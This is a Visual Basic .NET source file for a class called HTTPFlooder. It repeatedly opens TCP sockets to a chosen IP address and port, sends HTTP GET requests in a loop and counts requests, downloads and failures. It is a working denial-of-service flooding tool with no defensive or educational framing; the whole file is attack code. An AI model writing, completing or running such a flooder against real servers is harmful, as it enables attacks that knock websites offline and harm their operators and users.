Imports System
Imports System.ComponentModel
Imports System.Net
Imports System.Net.Sockets
Public Class HTTPFlooder

    Public State As ReqState = ReqState.Ready
    Private LastAction As Long
    Private rnd As Random = New Random

    Public Sub New(ByVal ip As String, ByVal port As Integer, ByVal subSite As String, ByVal resp As Boolean, ByVal delay As Integer, ByVal timeout As Integer)
        MyBase.New()
        Me.IP = ip
        Me.Port = port
        Me.Subsite = subSite
        Me.Resp = resp
        Me.Delay = delay
        Me.Timeout = timeout
    End Sub

    Public Downloaded As Integer
    Public Requested As Integer
    Public Failed As Integer
    Public IsFlooding As Boolean
    Public IP As String
    Public Port As Integer
    Public Subsite As String
    Public Delay As Integer
    Public Timeout As Integer
    Public Resp As Boolean

    Public Sub Start()
        IsFlooding = True
        LastAction = Tick
        Dim tTimepoll As New System.Windows.Forms.Timer
        AddHandler tTimepoll.Tick, AddressOf Me.tTimepoll_Tick
        tTimepoll.Start()
        Dim bw As New BackgroundWorker
        AddHandler bw.DoWork, AddressOf Me.bw_DoWork
        bw.RunWorkerAsync()
    End Sub
    Private Sub tTimepoll_Tick(ByVal sender As Object, ByVal e As EventArgs)
        If (Tick _
                    > (LastAction + Timeout)) Then
            IsFlooding = False
            Failed = (Failed + 1)
            State = ReqState.Failed
        End If
    End Sub
    Private Sub bw_DoWork(ByVal sender As Object, ByVal e As DoWorkEventArgs)
        Try
            Dim buf() As Byte = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0} HTTP/1.0{1}{1}{1}", Subsite, Environment.NewLine))
            Dim host As New IPEndPoint(System.Net.IPAddress.Parse(IP), Port)

            While IsFlooding
                State = ReqState.Ready
                ' SET STATE TO READY //
                LastAction = Tick
                Dim recvBuf() As Byte = New Byte((64) - 1) {}
                Dim socket As New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                State = ReqState.Connecting
                ' SET STATE TO CONNECTING //
                socket.Connect(host)
                socket.Blocking = Resp
                State = ReqState.Requesting
                ' SET STATE TO REQUESTING //
                socket.Send(buf, SocketFlags.None)
                State = ReqState.Downloading
                Requested = (Requested + 1)
                ' SET STATE TO DOWNLOADING // REQUESTED++
                If Resp Then
                    socket.Receive(recvBuf, 64, SocketFlags.None)
                End If
                State = ReqState.Completed
                Downloaded = (Downloaded + 1)
                ' SET STATE TO COMPLETED // DOWNLOADED++
                If (Delay > 0) Then
                    System.Threading.Thread.Sleep(Delay)
                End If

            End While
        Catch ex As System.Exception

        Finally
            IsFlooding = False
        End Try
    End Sub
    Private Shared Function Tick() As Long
        Return (DateTime.Now.Ticks / 10000)
    End Function
    Public Enum ReqState

        Ready

        Connecting

        Requesting

        Downloading

        Completed

        Failed
    End Enum
End Class